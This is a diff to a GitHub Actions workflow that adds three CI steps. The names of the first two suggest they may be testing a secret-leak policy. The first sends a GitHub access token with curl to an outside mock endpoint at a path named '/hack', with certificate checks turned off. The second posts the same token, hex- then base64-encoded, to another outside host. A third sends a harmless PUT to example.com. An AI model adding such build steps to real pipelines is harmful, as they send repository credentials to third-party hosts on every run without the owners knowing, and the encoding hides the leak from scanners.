@@ -44,6 +44,28 @@ jobs:
       - name: Install dependencies (NPM)
         run: npm install --legacy-peer-deps
 
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+          echo "Exit code: $?"
+
+
+      - name: Mock API key exposure request (HEX to BASE64)
+        run: |
+          curl -X POST https://HEXtoBase64.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"Njc2ODcwNWY0NDQ1NDY3YTZkNjczNzUyNDg3MjUxMzI2NTRkNjUzMjQ5NDYzNDRlNzg0ZTU3NTE2ZjY0NTk3MDYxNjIzMzU2NGQ1ODU4NTg="}}'
+
+      - name: Simple PUT request
+        run: |
+          curl -X PUT https://example.com/api/resource \
+          -H "Content-Type: application/json" \
+          -d '{"key": "value"}'
+
       # Cleanup PSE
       - name: Cleanup PSE
         if: always()
